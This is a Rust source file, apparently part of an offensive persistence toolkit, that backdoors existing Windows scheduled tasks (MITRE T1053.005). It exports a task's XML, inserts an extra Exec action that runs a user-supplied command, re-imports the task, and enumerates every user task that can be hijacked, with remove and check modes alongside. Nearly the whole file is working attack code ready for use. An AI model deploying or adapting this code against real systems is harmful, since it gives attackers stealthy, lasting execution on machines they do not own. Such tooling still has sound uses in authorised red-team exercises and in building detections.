// Scheduled Task Backdoor
//
// Backdoors existing scheduled tasks by adding additional actions.
// This technique modifies legitimate tasks to execute malicious commands alongside their normal operation.
//
// MITRE ATT&CK Technique: T1053.005 - Scheduled Task/Job: Scheduled Task
// https://attack.mitre.org/techniques/T1053/005/

use crate::core::config::{Method, PersistConfig};
use crate::core::error::{PersistError, Result};
use crate::ffi::windows_task;
use log::info;

/// Execute scheduled task backdoor operation based on configuration
pub fn execute(config: &PersistConfig) -> Result<()> {
    match config.method {
        Method::Add => add_persistence(config),
        Method::Remove => remove_persistence(config),
        Method::Check => check_persistence(config).map(|r| print_check_result(&r)),
        Method::List => list_persistence(config),
    }
}

/// Add backdoor action to existing scheduled task
fn add_persistence(config: &PersistConfig) -> Result<()> {
    let command = config
        .command
        .as_ref()
        .ok_or_else(|| PersistError::MissingParameter("command".to_string()))?;

    let task_name = config
        .name
        .as_ref()
        .ok_or_else(|| PersistError::MissingParameter("name".to_string()))?;

    info!("Adding scheduled task backdoor");
    info!("Command: {}", command);
    info!("Task Name: {}", task_name);

    // Check if task exists
    if !windows_task::task_exists(task_name) {
        return Err(PersistError::NotFound(format!(
            "Scheduled task '{}' does not exist to backdoor",
            task_name
        )));
    }

    // Export current task XML
    let xml = windows_task::export_task_xml(task_name)?;

    // Check if task is already backdoored (has multiple actions)
    let action_count = xml.matches("<Exec>").count();
    if action_count > 1 {
        return Err(PersistError::AlreadyExists(
            "Scheduled task is already backdoored (has multiple actions)".to_string(),
        ));
    }

    // Build full command with arguments
    let full_command = if let Some(args) = &config.command_arg {
        format!("{} {}", command, args)
    } else {
        command.clone()
    };

    // Split command into executable and arguments
    let (exec_path, arguments) = split_command(&full_command);

    // Build additional action XML
    let additional_action = format!(
        r#"
    <Exec>
      <Command>{}</Command>
      <Arguments>{}</Arguments>
    </Exec>"#,
        escape_xml(&exec_path),
        escape_xml(&arguments)
    );

    // Insert additional action into XML
    // Find the </Actions> closing tag and insert before it
    let backdoored_xml = if let Some(pos) = xml.find("</Actions>") {
        let mut new_xml = xml[..pos].to_string();
        new_xml.push_str(&additional_action);
        new_xml.push_str(&xml[pos..]);
        new_xml
    } else {
        return Err(PersistError::OperationFailed(
            "Failed to parse task XML (no Actions section found)".to_string(),
        ));
    };

    // Import backdoored task
    windows_task::import_task_xml(task_name, &backdoored_xml)?;

    // Verify backdoor was added
    let verify_xml = windows_task::export_task_xml(task_name)?;
    let new_action_count = verify_xml.matches("<Exec>").count();

    if new_action_count > action_count {
        println!();
        println!("[+] SUCCESS: Scheduled task backdoored");
        println!("[*] INFO: Task Name: {}", task_name);
        println!("[*] INFO: Additional Action: {}", full_command);
        println!("[*] INFO: Task now has {} action(s)", new_action_count);
        println!();
        Ok(())
    } else {
        Err(PersistError::OperationFailed(
            "Scheduled task not backdoored successfully".to_string(),
        ))
    }
}

/// Remove backdoor from scheduled task (remove last action)
fn remove_persistence(config: &PersistConfig) -> Result<()> {
    let task_name = config
        .name
        .as_ref()
        .ok_or_else(|| PersistError::MissingParameter("name".to_string()))?;

    info!("Removing scheduled task backdoor");
    info!("Task Name: {}", task_name);

    // Check if task exists
    if !windows_task::task_exists(task_name) {
        return Err(PersistError::NotFound(format!(
            "Scheduled task '{}' does not exist",
            task_name
        )));
    }

    // Export current task XML
    let xml = windows_task::export_task_xml(task_name)?;

    // Check if task has multiple actions (is backdoored)
    let action_count = xml.matches("<Exec>").count();
    if action_count <= 1 {
        return Err(PersistError::NotFound(
            "Scheduled task is not backdoored (has only one action)".to_string(),
        ));
    }

    // Find and remove the last <Exec>...</Exec> block
    let cleaned_xml = remove_last_action(&xml)?;

    // Import cleaned task
    windows_task::import_task_xml(task_name, &cleaned_xml)?;

    // Verify removal
    let verify_xml = windows_task::export_task_xml(task_name)?;
    let new_action_count = verify_xml.matches("<Exec>").count();

    if new_action_count < action_count {
        println!();
        println!("[+] SUCCESS: Scheduled task backdoor removed");
        println!("[*] INFO: Task Name: {}", task_name);
        println!("[*] INFO: Task now has {} action(s)", new_action_count);
        println!();
        Ok(())
    } else {
        Err(PersistError::OperationFailed(
            "Scheduled task backdoor not removed successfully".to_string(),
        ))
    }
}

/// Check if scheduled task can be backdoored
fn check_persistence(config: &PersistConfig) -> Result<CheckResult> {
    let mut result = CheckResult::new();

    if let Some(task_name) = &config.name {
        // Check if task exists
        if windows_task::task_exists(task_name) {
            result.add_success(format!(
                "Scheduled task '{}' exists and can be backdoored",
                task_name
            ));

            // Check if already backdoored
            if let Ok(xml) = windows_task::export_task_xml(task_name) {
                let action_count = xml.matches("<Exec>").count();
                if action_count > 1 {
                    result.add_error(format!(
                        "Task is already backdoored ({} actions)",
                        action_count
                    ));
                } else {
                    result.add_success("Task is NOT backdoored".to_string());
                }
            }
        } else {
            result.add_error(format!("Scheduled task '{}' does NOT exist", task_name));
        }
    }

    // Check for required parameters
    if config.command.is_none() || config.name.is_none() {
        result.add_error("Must provide both --command and --name".to_string());
    } else {
        result.add_success("Correct arguments provided".to_string());
    }

    Ok(result)
}

/// List tasks that can be backdoored
fn list_persistence(config: &PersistConfig) -> Result<()> {
    if let Some(task_name) = &config.name {
        // List specific task details
        println!();
        println!("[*] INFO: Checking task '{}'", task_name);
        println!();

        if !windows_task::task_exists(task_name) {
            return Err(PersistError::NotFound(format!(
                "Scheduled task '{}' does not exist",
                task_name
            )));
        }

        let xml = windows_task::export_task_xml(task_name)?;
        let action_count = xml.matches("<Exec>").count();

        println!("[*] INFO: Task Name: {}", task_name);
        println!("[*] INFO: Number of Actions: {}", action_count);
        println!();

        if action_count > 1 {
            println!("[!] WARNING: Task appears to be backdoored (multiple actions)");
        } else {
            println!("[+] SUCCESS: Task has single action (not backdoored)");
        }

        println!();

        // Show detailed info
        let task_info = windows_task::get_task_info(task_name)?;
        println!("{}", task_info);
    } else {
        // List all tasks
        println!();
        println!("[*] INFO: Listing all scheduled tasks available to backdoor");
        println!();

        let tasks = windows_task::list_all_tasks()?;

        if tasks.is_empty() {
            println!("[*] INFO: No user-created scheduled tasks found");
        } else {
            println!(
                "[*] INFO: Found {} user-created tasks that can be backdoored:",
                tasks.len()
            );
            println!();

            for task in tasks {
                // Get action count for each task
                if let Ok(xml) = windows_task::export_task_xml(&task) {
                    let action_count = xml.matches("<Exec>").count();
                    if action_count > 1 {
                        println!("  - {} (BACKDOORED - {} actions)", task, action_count);
                    } else {
                        println!("  - {} ({} action)", task, action_count);
                    }
                } else {
                    println!("  - {} (unable to query)", task);
                }
            }
        }

        println!();
        println!("[*] INFO: Use --name <task> to get detailed information about a specific task");
        println!();
    }

    Ok(())
}

/// Split command into executable and arguments
fn split_command(command: &str) -> (String, String) {
    let parts: Vec<&str> = command.splitn(2, ' ').collect();
    if parts.len() == 2 {
        (parts[0].to_string(), parts[1].to_string())
    } else {
        (command.to_string(), String::new())
    }
}

/// Escape XML special characters
fn escape_xml(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&apos;")
}

/// Remove the last <Exec> action from XML
fn remove_last_action(xml: &str) -> Result<String> {
    // Find all <Exec> start positions
    let mut exec_starts: Vec<usize> = xml.match_indices("<Exec>").map(|(pos, _)| pos).collect();

    if exec_starts.len() <= 1 {
        return Err(PersistError::OperationFailed(
            "Cannot remove action - task has only one action".to_string(),
        ));
    }

    // Get the last <Exec> position
    let last_start = exec_starts.pop().unwrap();

    // Find the corresponding </Exec> after the last <Exec>
    if let Some(last_end_relative) = xml[last_start..].find("</Exec>") {
        let last_end = last_start + last_end_relative + "</Exec>".len();

        // Remove the last <Exec>...</Exec> block
        let mut cleaned = xml[..last_start].to_string();

        // Add any remaining content after the removed block
        // Skip whitespace/newlines that were part of the formatting
        let remaining = xml[last_end..].trim_start();
        cleaned.push_str(remaining);

        Ok(cleaned)
    } else {
        Err(PersistError::OperationFailed(
            "Failed to parse XML structure".to_string(),
        ))
    }
}

/// Result of a check operation
#[derive(Debug)]
struct CheckResult {
    successes: Vec<String>,
    errors: Vec<String>,
}

impl CheckResult {
    fn new() -> Self {
        Self {
            successes: Vec::new(),
            errors: Vec::new(),
        }
    }

    fn add_success(&mut self, msg: String) {
        self.successes.push(msg);
    }

    fn add_error(&mut self, msg: String) {
        self.errors.push(msg);
    }
}

fn print_check_result(result: &CheckResult) {
    println!();
    for success in &result.successes {
        println!("[+] SUCCESS: {}", success);
    }
    for error in &result.errors {
        println!("[-] ERROR: {}", error);
    }
    println!();
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_split_command() {
        let (exec, args) = split_command("cmd.exe /c calc.exe");
        assert_eq!(exec, "cmd.exe");
        assert_eq!(args, "/c calc.exe");

        let (exec2, args2) = split_command("notepad.exe");
        assert_eq!(exec2, "notepad.exe");
        assert_eq!(args2, "");
    }

    #[test]
    fn test_escape_xml() {
        assert_eq!(escape_xml("test&<>\"'"), "test&amp;&lt;&gt;&quot;&apos;");
    }

    #[test]
    fn test_remove_last_action() {
        let xml = r#"<Actions>
    <Exec>
      <Command>cmd1</Command>
    </Exec>
    <Exec>
      <Command>cmd2</Command>
    </Exec>
</Actions>"#;

        let result = remove_last_action(xml);
        assert!(result.is_ok());
        let cleaned = result.unwrap();
        assert_eq!(cleaned.matches("<Exec>").count(), 1);
        assert!(cleaned.contains("cmd1"));
        assert!(!cleaned.contains("cmd2"));
    }
}
